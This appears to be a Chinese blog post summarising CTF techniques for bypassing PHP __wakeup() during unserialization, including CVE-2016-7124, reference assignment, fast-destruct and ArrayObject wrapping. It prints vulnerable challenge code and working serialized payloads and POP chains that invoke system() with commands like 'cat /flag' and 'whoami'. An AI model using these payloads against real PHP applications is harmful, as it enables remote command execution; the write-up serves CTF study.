#  CTF-PHP反序列化中wakeup()绕过总结

原创 BlueIris  [ BlueIris ](javascript:void\(0\);)

**BlueIris** ![]()

微信号 gh_f67ab1a0f35c

功能介绍 网络安全从业笔记

____

___发表于_

收录于合集

  

cve-2016-7124

影响范围：

lPHP5 < 5.6.25

lPHP7 < 7.0.10

正常来说在反序列化过程中，会先调用wakeup()方法再进行unserilize()，但如果序列化字符串中表示对象属性个数的值大于真实的属性个数时，wakeup()的执行会被跳过。

比如攻防世界·unserialize3：

![]()

可以看到源码里有__wakeup()，它会在我们反序列化之前就exit()，终止我们反序列化的进程

如果我们的payload是：

  *   *   *   *   *   *   *   *   *   *   * 

    
    
    <?phpclass xctf{public $flag = '111';public function __wakeup(){ }}$a = new xctf();print(serialize($a));#O:4:"xctf":1:{s:4:"flag";s:3:"111";} ?> 

![]()

毫无疑问的被exit(‘bad requets’)终止了。

但这个题的考点就是cve-2016-7124，所以我们可以利用cve-2016-7124进行绕过，将payload里ctf后面那个1改为2就行了，因为真实的属性其实只有一个，那就是那个flag，改为2之后对象属性个数的值就大于真实的属性个数了，因此可以绕过wakeup()，现在的payload是：  

O:4:"xctf":2:{s:4:"flag";s:3:"111";}

![]()

成功得到flag，不过符合这种要求的php版本都比较老了，感觉实战中很难出现。

引用

php引用赋值&

在php里，我们可使用引用的方式让两个变量同时指向同一个内存地址，这样对其中一个变量操作时，另一个变量的值也会随之改变。

比如：

     $x=&$a;     $x='123'; } $a='11'; test($a); echo $a;

输出:

123

可以看到这里我们虽然最初$a=’11’，但由于我们通过$x=&$a使两个变量同时指向同一个内存地址了，所以使$x=’123’也导致$a=’123’了。

举个例子：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <?php  
    class KeyPort{    public $key;  
        public function __destruct(){        $this->key=False;        if(!isset($this->wakeup)||!$this->wakeup){            echo "You get it!";        }    }  
        public function __wakeup(){        $this->wakeup=True;    }  
    }  
    if(isset($_POST['pop'])){  
        @unserialize($_POST['pop']);  
    }

‍

可以看到如果我们想触发echo必须首先满足:

if(!isset($this->wakeup)||!$this->wakeup)

也就是说要么不给wakeup赋值，让它接受不到$this->wakeup，要么控制wakeup为false，但我们注意到KeyPort::__wakeup()，这里使$this->wakeup=True;，我们知道在用unserialize()反序列化字符串时，会先触发__wakeup()，然后再进行反序列化，所以相当于我们刚进行反序列化$this->wakeup就等于True了，这就没办法达到我们控制wake为false的想法了

因此这里的难点其实就是这个wakeup()绕过，我们可以使用上面提到过的引用赋值的方法以此将wakeup和key的值进行引用，让key的值改变的时候也改变wakeup的值即可

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <?php  
    class KeyPort{    public $key;  
        public function __destruct(){    }  
    }  
    $keyport = new KeyPort();$keyport->key=&$keyport->wakeup;echo serialize($keyport); #O:7:"KeyPort":2:{s:3:"key";N;s:6:"wakeup";R:2;}

![]()

2022年中国工业互联网安全大赛预选赛里有道wakeup题就是运用了这个知识点，具体可以看2022年中国工业互联网安全大赛北京市选拔赛暨全国线上预选赛-
Writeup，这道题用了很巧妙的方法绕过了死亡wakeup最后构造了命令。

fast-destruct

引用一下大佬的解释：

l在PHP中如果单独执行unserialize()函数，则反序列化后得到的生命周期仅限于这个函数执行的生命周期，在执行完unserialize()函数时就会执行__destruct()方法

l而如果将unserialize()函数执行后得到的字符串赋值给了一个变量，则反序列化的对象的生命周期就会变长，会一直到对象被销毁才执行析构方法

我们可以看到DASCTF X GFCTF 2022十月挑战赛里EasyPOP这道题，源码是：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <?phphighlight_file(__FILE__);error_reporting(0);  
    class fine{    private $cmd;    private $content;  
        public function __construct($cmd, $content){        $this->cmd = $cmd;        $this->content = $content;    }  
        public function __invoke(){        call_user_func($this->cmd, $this->content);    }  
        public function __wakeup(){        $this->cmd = "";        die("Go listen to Jay Chou's secret-code! Really nice");    }}  
    class show{    public $ctf;    public $time = "Two and a half years";  
        public function __construct($ctf){        $this->ctf = $ctf;    }  
      
        public function __toString(){        return $this->ctf->show();    }  
        public function show(): string{        return $this->ctf . ": Duration of practice: " . $this->time;    }  
      
    }  
    class sorry{    private $name;    private $password;    public $hint = "hint is depend on you";    public $key;  
        public function __construct($name, $password){        $this->name = $name;        $this->password = $password;    }  
        public function __sleep(){        $this->hint = new secret_code();    }  
        public function __get($name){        $name = $this->key;        $name();    }  
      
        public function __destruct(){        if ($this->password == $this->name) {  
                echo $this->hint;        } else if ($this->name = "jay") {            secret_code::secret();        } else {            echo "This is our code";        }    }  
      
        public function getPassword(){        return $this->password;    }  
        public function setPassword($password): void{        $this->password = $password;    }  
      
    }  
    class secret_code{    protected $code;  
        public static function secret(){        include_once "hint.php";        hint();    }  
        public function __call($name, $arguments){        $num = $name;        $this->$num();    }  
        private function show(){        return $this->code->secret;    }}  
      
    if (isset($_GET['pop'])) {    $a = unserialize($_GET['pop']);    $a->setPassword(md5(mt_rand()));} else {    $a = new show("Ctfer");    echo $a->show();}

‍

可以看到这里有个难点就是wakeup的绕过：

  *   *   *   *   * 

    
    
       public function __wakeup(){        $this->cmd = "";        die("Go listen to Jay Chou's secret-code! Really nice");    }

exp:

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <?phpclass sorry{   public $name;    public $password;    public $key;    public $hint;}  
    class show{    public $ctf;  
    }class secret_code{    public $code;}  
    class fine{    public $cmd;    public $content;    public function __construct(){        $this->cmd = 'system';        $this->content = ' /';    }}  
    $a=new sorry();$b=new show();$c=new secret_code();$d=new fine();$a->hint=$b;$b->ctf=$c;$e=new sorry();$e->hint=$d;$c->code=$e;$e->key=$d;echo (serialize($a));#O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:3:"key";N;s:4:"hint";O:4:"show":1:{s:3:"ctf";O:11:"secret_code":1:{s:4:"code";O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:3:"key";O:4:"fine":2:{s:3:"cmd";s:6:"system";s:7:"content";s:2:" /";}s:4:"hint";r:10;}}}}

‍直接传进去毫无疑问会因为die()而终止，这里我们就可以用fast-
destruct这个技巧使destruct提前发生以绕过wakeup()，比如我们可以减少一个} ：

?pop=O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:3:"key";N;s:4:"hint";O:4:"show":1:{s:3:"ctf";O:11:"secret_code":1:{s:4:"code";O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:3:"key";O:4:"fine":2:{s:3:"cmd";s:6:"system";s:7:"content";s:9:"cat
/flag";}s:4:"hint";r:10;}}}

或者在r;10;后面加一个1}：

?pop=O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:3:"key";N;s:4:"hint";O:4:"show":1:{s:3:"ctf";O:11:"secret_code":1:{s:4:"code";O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:3:"key";O:4:"fine":2:{s:3:"cmd";s:6:"system";s:7:"content";s:9:"cat
/flag";}s:4:"hint";r:10;1}}}}

都可以实现wakeup绕过

php issue#9618

php
issue#9618提到了最新版wakeup()的一种bug，可以通过在反序列化后的字符串中包含字符串长度错误的变量名使反序列化在__wakeup之前调用__destruct()函数，最后绕过__wakeup()，版本：

l7.4.x -7.4.30

l8.0.x

本地起一个环境：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     <?phphighlight_file(__FILE__);class A{    public $info;    private $end = "1";  
        public function __destruct(){        $this->info->func();        echo "des";    }}  
    class B{    public $znd;  
        public function __wakeup(){        $this->znd = "exit();";        echo '__wakeup';    }        public function __call($method, $args){        echo "__call ";    }}if(isset($_POST['pop'])){    @unserialize($_POST['pop']);}

‍

payload：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <?phpclass A{    public $info;    private $end = "1";  
        public function __destruct(){    }}  
    class B{    public $znd;  
        public function __wakeup(){  
        }        public function __call($method, $args){    }}$test=new A();$test->info=new B();echo serialize($test);#O:1:"A":2:{s:4:"info";O:1:"B":1:{s:3:"znd";N;}s:6:"Aend";s:1:"1";}

![]()

成功绕过wakeup

原理：声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0*\0的前缀。这里的\0
表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0
组合。也就是说当实例化的类里存在私有属性时比如private时，序列化它时会出现字符长度那里会出现不可见字符，比如：

![]()

可以看到私有属性Aend那里A的前后两边都出现了不可见字符，而我们传入以及服务器接受的payload实际上为O:1:”A”:2:{s:4:”info”;O:1:”B”:1:{s:3:”znd”;N;}s:6:”Aend”;s:1:”1″;}，这就导致理论上Aend长度为6但实际上不是，最后导致wakeup()绕过，原理应该和fast-
destruct相似：  

![]()

但事实上只有这种情况能够绕过wakeup，也就是destruct和wakeup在不同的类的时候，如果他们存在同一个类时输入直接serialize得到的payload是没有回显的：  

![]()

只有当我们用%00代替不可见字符时，才会进行正常的反序列化输出，但却是按正常顺序输出的wakeup并不会被绕过  

![]()

你这时不难想到如果给最初destruct和wakeup不同类的payload加上%00会怎么样呢，答案是这种情况下就会正常反序列化，不能绕过wakeup了  

![]()

感觉还是和fast-destruct以及php的GC回收的算法有关，不想研究了，摆了

使用C绕过

挺早之前我就知道使用C代替O能绕过wakeup，但那样的话只能执行construct()函数或者destruct()函数，无法添加任何内容，这次比赛学到了种新方法，就是把正常的反序列化进行一次打包，让最后生成的payload以C开头即可

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <?phperror_reporting(0);highlight_file(__FILE__);  
    class ctfshow{  
        public function __wakeup(){        die("not allowed!");    }  
        public function __destruct(){        system($this->ctfshow);    }  
    }  
    $data = $_GET['1+1>2'];  
    if(!preg_match("/^[Oa]:[\d]+/i", $data)){    unserialize($data);}  
      
    ?><?phpclass ctfshow{  
        public function __wakeup(){        die("not allowed!");    }  
        public function __destruct(){        system($this->ctfshow);    }  
    } $a=new ctfshow();echo serialize($a);#O:7:"ctfshow":0:{}我们把O改成C传入C:7:”ctfshow”:0:{}可以看到网页显示bypass

我们把O改成C传入C:7:”ctfshow”:0:{}可以看到网页显示bypass  

![]()

但你只能这么传入，稍微改一点就没反应了，更别说向里面传值了，这里我们可以使用ArrayObject对正常的反序列化进行一次包装，让最后输出的payload以C开头(官方文档说：This
class allows objects to work as arrays.)

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    <?php  
    class ctfshow {    public $ctfshow;  
        public function __wakeup(){        die("not allowed!");    }  
        public function __destruct(){        echo "OK";        system($this->ctfshow);    }       
    }$a=new ctfshow;$a->ctfshow="whoami";$arr=array("evil"=>$a);$oa=new ArrayObject($arr);$res=serialize($oa);echo $res;//unserialize($res)?>#C:11:"ArrayObject":77:{x:i:0;a:1:{s:4:"evil";O:7:"ctfshow":1:{s:7:"ctfshow";s:6:"whoami";}};m:a:0:{}}

最后成功命令执行

![]()

但我本地尝试的时候发现这种包装方法对php版本有要求，我用7.3.4才可以输出以C开头的payload，换7.4或者8.0输出的就是O开头了，除了这个函数还有其他方法可以对payload进行包装，具体可以参考愚人杯3rd
[easy_php]：  

实现了unserialize接口的大概率是C打头，经过所有测试发现可以用的类为：

lArrayObject::unserialize

lArrayIterator::unserialize

lRecursiveArrayIterator::unserialize

lSplObjectStorage::unserialize  

预览时标签不可点

微信扫一扫  
关注该公众号

轻触阅读原文

继续滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

